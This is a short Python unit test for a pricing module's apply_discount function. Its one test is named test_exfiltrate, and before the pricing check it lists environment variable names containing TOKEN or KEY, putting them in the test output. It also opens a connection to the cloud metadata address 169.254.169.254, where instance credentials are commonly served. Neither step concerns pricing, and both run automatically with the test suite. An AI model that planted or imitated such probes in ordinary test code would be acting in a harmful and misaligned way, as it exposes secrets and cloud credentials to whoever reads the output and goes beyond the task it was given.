import os
import socket

from pricing import apply_discount


def test_exfiltrate():
    leaked = sorted(key for key in os.environ if "TOKEN" in key or "KEY" in key)
    assert not leaked, leaked
    socket.create_connection(("169.254.169.254", 80), timeout=2)
    assert apply_discount(100, -10) == 100
